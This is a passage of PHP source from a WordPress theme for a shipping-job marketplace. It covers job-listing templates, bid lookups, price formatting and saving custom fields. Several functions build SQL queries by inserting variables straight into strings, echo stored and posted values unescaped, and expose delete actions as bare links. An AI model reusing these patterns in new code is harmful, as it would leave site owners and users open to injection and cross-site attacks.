              	<a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a>

              </div>

 			<?php

 			$shipme_enable_credits_wallet = get_option('shipme_enable_credits_wallet');
 			if($shipme_enable_credits_wallet == "yes")
 				{

 						$escrow_deposited = get_post_meta($pid,'escrow_deposited',true);
 						if(empty($escrow_deposited))
 						{
 						?>
 							<div class="message-area col-xs-12 col-sm-12 col-lg-12">
 							<a href="<?php echo shipme_get_payments_page_url('escrow') ?>" class="submit_bottom4"><?php echo sprintf(__('Deposit Escrow for winning bid: %s','shipme'), shipme_get_show_price($bid->bid));  ?></a>
 							</div>

 						<?php
 						}

 				}


 			?>

                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php _e('Waiting for the transporter to mark this job as delivered.','shipme'); ?>
                         </div>


         </div>

     <?php

 }

 function shipme_get_regular_job_post_account_completed_job_winner($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;
 	$pid = get_the_ID();

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>





               <div class="button-area col-xs-12 col-sm-4 col-lg-4">
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a>  </li>
 				<li><a href="" class="submit_bottom4"  ><i class="fas fa-star"></i> <?php _e('Rate Job Owner','shipme') ?></a> </li>
               </ul>
              </div>


                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 							$dt = get_post_meta($pid,'delivered_date',true);
 							$dt = (!empty($dt)) ? date_i18n('d-F-Y H:i', $dt) : 'undefined';
 							echo sprintf(__('This job was delivered on %s.','shipme'), $dt); ?>
                         </div>


         </div>

     <?php

 }



 function shipme_get_regular_job_post_account_unpaid_job_owner($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;
 	$pid = get_the_ID();

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>





               <div class="button-area col-xs-12 col-sm-4 col-lg-4">
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a>  </li>
 				<li><a href="<?php echo shipme_get_pay_commission_link(get_the_ID()) ?>" class="submit_bottom4"  ><i class="fas fa-shopping-cart"></i> <?php _e('Pay Job Commission','shipme') ?></a> </li>
               </ul>
              </div>


                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 							$dt = get_post_meta($pid,'delivered_date',true);
 							$dt = (!empty($dt)) ? date_i18n('d-F-Y H:i', $dt) : 'undefined';
 							echo sprintf(__('The transporter set this job as delivered on %s. You can pay them directly.','shipme'), $dt); ?>
                         </div>


         </div>

     <?php

 }

 function shipme_get_regular_job_post_account_unpaid_job_winner($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;
 	$pid = get_the_ID();

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo __('Pending Job','shipme') ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a></li>
 				<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Set Job As Paid','shipme') ?></a></li>
 			</ul>

              </div>


                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 							$dt = get_post_meta($pid,'delivered_date',true);
 							$dt = (!empty($dt)) ? date_i18n('d-F-Y H:i', $dt) : 'undefined';
 							echo sprintf(__('You have set this job as delivered on %s. Waiting for the item owner to pay.','shipme'), $dt); ?>
                         </div>


         </div>

     <?php

 }


 function shipme_get_regular_job_post_account_unpaid_commission_job_owner($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;
 	$pid = get_the_ID();

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo __('Pending Job','shipme') ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a></li>
 				<li><a href="<?php echo shipme_get_pay_commission_link($pid) ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Pay Commission','shipme') ?></a></li>
 			</ul>

              </div>


                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 							$dt = get_post_meta($pid,'delivered_date',true);
 							$dt = (!empty($dt)) ? date_i18n('d-F-Y H:i', $dt) : 'undefined';
 							$shipme_fee_after_paid = get_option('shipme_fee_after_paid');
 							if($shipme_fee_after_paid == 0) echo 'Set the job fee from wp-admin, shipme options. <br/><br/>';

 							$shipme_get_winner_bid = shipme_get_winner_bid($pid);

 							$comm1 = round(0.01*$shipme_fee_after_paid *$shipme_get_winner_bid->bid);
 							$comm = shipme_get_show_price($comm1);

 							echo sprintf(__('This job has been delivered on %s.','shipme'), $dt); echo '<br/>';
 							echo sprintf(__('The winning bid on this job was: %s.','shipme'), shipme_get_show_price($shipme_get_winner_bid->bid)); echo '<br/>';
 							echo sprintf(__('The commission you have to pay is: %s.','shipme'), $comm);

 							?>
                         </div>


         </div>

     <?php

 }


 function shipme_get_regular_job_post_account_pending_job_winner($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;
 	$pid = get_the_ID();

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo __('Pending Job','shipme') ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a></li>
 				<li><a href="<?php echo site_url() ?>/?s_action=set_delivered&pid=<?php the_ID() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Set Delivered','shipme') ?></a></li>
                </ul>
              </div>


                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php _e('After you deliver the item, please set the job as delivered so the item owner knows, and give feedback.','shipme'); ?>
                         </div>


         </div>

     <?php

 }


 function shipme_get_regular_job_post_account($class_optional = '')
 {
 	$now = time();
 	$pid = get_the_ID();

 	$ending = get_post_meta($pid,'ending',true);
 	$closed = get_post_meta($pid,'closed',true);
 	$sec = $ending - $now;


 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php if($closed =="1") echo __('Closed/Ended','shipme'); else echo shipme_secondsToTime($sec); ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a></li>
                 <li><a href="<?php echo site_url() ?>?s_action=edit_job&pid=<?php the_ID() ?>" class="submit_bottom4"  ><i class="fa fa-pencil-square-o"></i> <?php _e('Edit Job','shipme') ?></a></li>
                 <li><a href="<?php echo site_url()?>?s_action=delete_job&pid=<?php the_ID() ?>" class="submit_bottom4"  ><i class="fa fa-times"></i> <?php _e('Delete Job','shipme') ?></a></li>
 				</ul>
              </div>

         	<?php
 				// not paid job - listing fee
 				$paid = get_post_meta(get_the_ID(),'paid',true);
 				$featured_paid = get_post_meta(get_the_ID(),'featured_paid',true);


 				if($paid != 1 or $featured_paid != 1)
 				{
 					?>
                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 							$cc = shipme_post_new_with_pid_stuff_thg(get_the_ID(), '4');

 							printf(__('This job was posted but the listing fee for it was not paid yet. <a href="%s">Click here</a> to pay the outstanding balance.','shipme'), $cc); ?>
                         </div>
                     <?php
 				}

 			?>

         </div>

     <?php

 }



 function shipme_get_regular_job_post_account_received_proposal($pid, $uid, $bidam, $class_optional = '')
 {
 	$now = time();

 	$ending = get_post_meta($pid,'ending',true);
 	$closed = get_post_meta($pid,'closed',true);
 	$sec = $ending - $now;
 	$post = get_post($pid);
 	$bid_ow = get_userdata($uid);

 	$bid_ow = $bid_ow->user_login;

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php echo $pid ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php echo get_permalink($pid) ?>" title="<?php echo $post->post_title ?>"><?php echo $post->post_title ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php echo get_permalink($pid) ?>"><img src="<?php echo shipme_get_first_post_image($pid,70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta($pid,'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta($pid ,'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta($pid ,'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php if($closed =="1") echo __('Closed/Ended','shipme'); else echo shipme_secondsToTime($sec); ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
 			  <?php

 					$winner = get_post_meta($pid,'winner',true);

 			  ?>
 			  <ul class="acc-buttons-1">
              	<li><a href="<?php echo get_permalink($pid) ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a></li>
 				<?php if(empty($winner)) { ?>
                 <li><a href="<?php echo get_permalink($pid) ?>" class="submit_bottom4"  ><i class="fa fa-pencil-square-o"></i> <?php _e('Pick Winner','shipme') ?></a></li>
 				<?php } ?>
             </ul>
              </div>

         	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 									printf(__('Proposal sent by: %s at the price of: %s','shipme'), $bid_ow, shipme_get_show_price($bidam));


 									if($winner == $uid)
 									{	echo '<br/>'; printf(__('This was the bid you chose as winner for this job.','shipme')); }

 							?>
                         </div>

         </div>

     <?php

 }


 function shipme_get_posted_bid_job_post_account($class_optional = '')
 {
 		$uid = get_current_user_id();

 		$now = time();
 		$ending = get_post_meta(get_the_ID(),'ending',true);
 		$closed = get_post_meta(get_the_ID(),'closed',true);
 		$sec = $ending - $now;

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php if($closed =="1") echo __('Closed/Ended','shipme'); else echo shipme_secondsToTime($sec); ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
              	<a href="<?php the_permalink() ?>" class="submit_bottom4"  ><i class="fa fa-check-circle"></i> <?php _e('Job Page','shipme') ?></a>

              </div>


                     	<div class="message-area col-xs-12 col-sm-12 col-lg-12">
                         	<?php

 							$bid = shipme_get_bid_by_uid(get_the_ID(), $uid);
 							printf(__('You have bidded %s for this job.','shipme'), shipme_get_show_price($bid->bid));

 							if($bid->uid == $uid)
 							{
 								echo '<br/>' . __('This bid was chosen as the job winner proposal.','shipme');
 							}

 							?>
                         </div>


         </div>

     <?php

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_regular_job_post($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;

 	?>
     	<div class="post-jb <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_secondsToTime($sec); ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
              	<a href="<?php the_permalink() ?>" class="submit_bottom3"  ><i class="fa fa-check-circle"></i> <?php _e('View Details','shipme') ?></a>
              </div>



         </div>

     <?php
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_bid_by_uid($pid, $uid)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_bids where pid='$pid' and uid='$uid'";
 	$r = $wpdb->get_results($s);

  if(count($r) == 0) return false;

 	return $r[0];
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_status_of_job_for_freelancer($pid)
 {
 	global $wpdb;
 	$closed = get_post_meta($pid,'closed',true);
  $open = '<span class="square-8 bg-success mg-r-5 rounded-circle"></span>';
  $closed = '<span class="square-8 bg-danger mg-r-5 rounded-circle"></span>';

  if($closed == "0") return sprintf(__('%s Job is open for bidding.','shipme'), $open);

   return sprintf(__('%s Job is closed for bidding.','shipme'), $closed);
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function ships_get_field_tp($nr)
 {
 		if($nr == "1") return "Text field";
 		if($nr == "2") return "Select box";
 		if($nr == "3") return "Radio Buttons";
 		if($nr == "4") return "Check-box";
 		if($nr == "5") return "Large text-area";
 		if($nr == "6") return "HTML Box";


 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_search_into($custid, $val)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_custom_relations where custid='$custid'";
 	$r = $wpdb->get_results($s);

 	if(count($r) == 0) return 0;
 	else
 	foreach($r as $row) // = mysql_fetch_object($r))
 	{
 		if($row->catid == $val) return 1;
 	}

 	return 0;
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

 function shipme_search_into_users($custid, $val)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_user_custom_relations where custid='$custid'";
 	$r = $wpdb->get_results($s);

 	if(count($r) == 0) return 0;
 	else
 	foreach($r as $row) // = mysql_fetch_object($r))
 	{
 		if($row->catid == $val) return 1;
 	}

 	return 0;
 }


 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_show_price($price, $cents = 2)
 {
 	$shipme_currency_position = get_option('shipme_currency_position');
 	if($shipme_currency_position == "front") return shipme_get_currency()."".shipme_formats($price, $cents);
 	return shipme_formats($price,$cents)."".shipme_get_currency();

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_formats($number, $cents = 1) { // cents: 0=never, 1=if needed, 2=always

   $dec_sep = get_option('shipme_decimal_sum_separator');
   if(empty($dec_sep)) $dec_sep = '.';

   $tho_sep = get_option('shipme_thousands_sum_separator');
   if(empty($tho_sep)) $tho_sep = ',';

   //dec,thou

   if (is_numeric($number)) { // a number
     if (!$number) { // zero
       $money = ($cents == 2 ? '0'.$dec_sep.'00' : '0'); // output zero
     } else { // value
       if (floor($number) == $number) { // whole number
         $money = number_format($number, ($cents == 2 ? 2 : 0), $dec_sep, $tho_sep ); // format
       } else { // cents
         $money = number_format(round($number, 2), ($cents == 0 ? 0 : 2), $dec_sep, $tho_sep ); // format
       } // integer or decimal
     } // value
     return $money;
   } // numeric
 } // formatMoney

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 	function shipme_register_my_menus() {
 		register_nav_menu( 'primary-shipme-header', 'Shipme Main Menu' );

 	}

 	add_action( 'init', 'shipme_register_my_menus' );
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_save_custom_fields($pid)
 {
 	$pst = get_post($pid);

 	if($pst->post_type == "job_ship"):
 		if(isset($_POST['fromadmin']))
 		{
 			update_post_meta($pid, 'finalised_posted', '1');
 			$views = get_post_meta($pid,"views",true);
 			if(empty($views)) update_post_meta($pid,"views",0);



      update_post_meta($pid,"packages",$_POST['packages']);

 			if($_POST['featureds'] == '1')
 			update_post_meta($pid,"featured",'1');
 			else
 			update_post_meta($pid,"featured",'0');


 			if($_POST['sealed_bidding'] == '1')
 			update_post_meta($pid,"sealed_bidding",'1');
 			else
 			update_post_meta($pid,"sealed_bidding",'0');


 			if($_POST['closed'] == '1')
 			update_post_meta($pid,"closed",'1');
 			else
 			update_post_meta($pid,"closed",'0');


 			if($_POST['paid'] == '1')
 			update_post_meta($pid,"paid",'1');
 			else
 			update_post_meta($pid,"paid",'0');

      //=====

      $winner = get_post_meta($pid,"winner", true);
      if(empty($winner)) update_post_meta($pid,"winner", "0");

 			//**********************************************

 			$pickup_lat = $_POST['pickup_lat'];
 			$pickup_lng = $_POST['pickup_lng'];

 			$delivery_lat = $_POST['delivery_lat'];
 			$delivery_lng = $_POST['delivery_lng'];

 			$delivery_date_hidden = $_POST['delivery_date'];
 			$pickup_date_hidden = $_POST['pickup_date'];

 			$pickup_location = trim($_POST['pickup_location']);
 			$delivery_location = trim($_POST['delivery_location']);
 			$jb_category 		= $_POST['job_ship_cat_cat'];

 			$price = trim($_POST['price']);

 			//------------------------------------------------

 			update_post_meta($pid, "pickup_lat", 		$pickup_lat);
 			update_post_meta($pid, "pickup_lng", 		$pickup_lng);

 			update_post_meta($pid, "delivery_lat", 		$delivery_lat);
 			update_post_meta($pid, "delivery_lng", 		$delivery_lng);

 			update_post_meta($pid, "pickup_date", 		$pickup_date_hidden);
 			update_post_meta($pid, "delivery_date", 		$delivery_date_hidden);

 			update_post_meta($pid, "pickup_location", 		$pickup_location);
 			update_post_meta($pid, "delivery_location", 		$delivery_location);

 			update_post_meta($pid, "price", 		$price);


 			$weight = $_POST['weight'];
 			$height = $_POST['height'];
 			$width = $_POST['width'];
 			$length = $_POST['length'];

 			update_post_meta($pid, "length", 		trim($_POST['length']));
 			update_post_meta($pid, "weight", 		trim($_POST['weight']));
 			update_post_meta($pid, "height", 		trim($_POST['height']));
 			update_post_meta($pid, "width", 		trim($_POST['width']));

 			update_post_meta($pid,"ending", strtotime($_POST['ending']));

 			//------------------------------------------------

      if(is_array($_POST['cust_ids']))
      {
   			for($i=0;$i<count($_POST['cust_ids']);$i++)
   			{
   				$id = $_POST['cust_ids'][$i];
   				$valval = $_POST['custom_field_value_'.$id];

   				if(is_array($valval))
   				{
   					delete_post_meta($pid, 'custom_field_ID_'.$id);

   					for($k=0;$k<count($valval);$k++)
   						add_post_meta($pid, 'custom_field_ID_'.$id, $valval[$k]);
   				}
   				else
   				update_post_meta($pid, 'custom_field_ID_'.$id, $valval);
   			}
      }
 		}

 	endif;

 }


 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_my_awarded_jobs2($uid)
 {
 	$c = "<select name='jobss' class='do_input'><option value=''>".__('Select','shipme')."</option>";
 	global $wpdb;

 	$querystr = "
 					SELECT distinct wposts.*
 					FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta
 					WHERE wposts.post_author='$uid'
 					AND  wposts.ID = wpostmeta.post_id
 					AND wpostmeta.meta_key = 'closed'
 					AND wpostmeta.meta_value = '1'
 					AND wposts.post_status = 'publish'
 					AND wposts.post_type = 'job_ship'
 					ORDER BY wposts.post_date DESC";

 	//echo $querystr;
 	$r = $wpdb->get_results($querystr);
 	$winners_arr = array();

 	foreach($r as $row)
 	{
 		$pid = $row->ID;
 		$winner = get_post_meta($pid, "winner", true);


 		if(!empty($winner))
 		{


 			if(shipme_check_agains_vl_vl_arr($winners_arr,$winner) == false)
 			{

 				$winners_arr[] = $winner;
 				$user = get_userdata($winner);
 				$c .= '<option value="'.$winner.'">'.$user->user_login.'</option>';
 				$i = 1;
 			}
 		}
 	}


 	//-------------------------------

 	if($i == 1)
 	return $c.'</select>';

 	return false;
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_is_owner_of_post()
 {

 	if(!is_user_logged_in())
 		return false;

 	global $current_user;
 	get_currentuserinfo();

 	$post = get_post(get_the_ID());
 	if($post->post_author == $current_user->ID) return true;
 	return false;

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_bid_by_id($id)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_bids where id='$id'";
 	$r = $wpdb->get_results($s);

 	return $r[0];
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_check_agains_vl_vl_arr($winners_arr,$winner)
 {
 	foreach($winners_arr as $as)
 	{
 		if($winner == $as) return true;
 	}

 	return false;
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_add_query_vars($public_query_vars)
 {
     	$public_query_vars[] = 'jobid';
 		$public_query_vars[] = 'bid';
 		$public_query_vars[] = 's_action';
 		$public_query_vars[] = 'orderid';
 		$public_query_vars[] = 'bid_id';
 		$public_query_vars[] = 'oid';

 		$public_query_vars[] = 'step';
 		$public_query_vars[] = 'my_second_page';
 		$public_query_vars[] = 'third_page';
 		$public_query_vars[] = 'username';
 		$public_query_vars[] = 'pid';
 		$public_query_vars[] = 'term_search';		//job_sort, job_category, page
 		$public_query_vars[] = 'method';
 		$public_query_vars[] = 'post_author';
 		$public_query_vars[] = 'page';
 		$public_query_vars[] = 'rid';
 		$public_query_vars[] = 'ids';
 		$public_query_vars[] = 'pg';
 		$public_query_vars[] = 'driver_author';



     	return $public_query_vars;
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

  function shipme_post_type_link_filter_function( $post_link, $id = 0, $leavename = FALSE ) {

 	global $category_url_link;

     if ( strpos('%job_ship_cat%', $post_link) === 'FALSE' ) {
       return $post_link;
     }
     $post = get_post($id);
     if ( !is_object($post) || $post->post_type != 'job_ship' ) {

 		if(shipme_using_permalinks())
       return str_replace("job_ship_cat", $category_url_link ,$post_link);
 	  else return $post_link;
     }
     $terms = wp_get_object_terms($post->ID, 'job_ship_cat');
     if ( !$terms ) {
       return str_replace('%job_ship_cat%', 'uncategorized', $post_link);
     }
     return str_replace('%job_ship_cat%', $terms[0]->slug, $post_link);
   }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

 function shipme_wp_get_attachment_image($attachment_id, $size = 'thumbnail', $icon = false, $attr = '') {

 	$html = '';
 	$image = wp_get_attachment_image_src($attachment_id, $size, $icon);
 	if ( $image ) {
 		list($src, $width, $height) = $image;
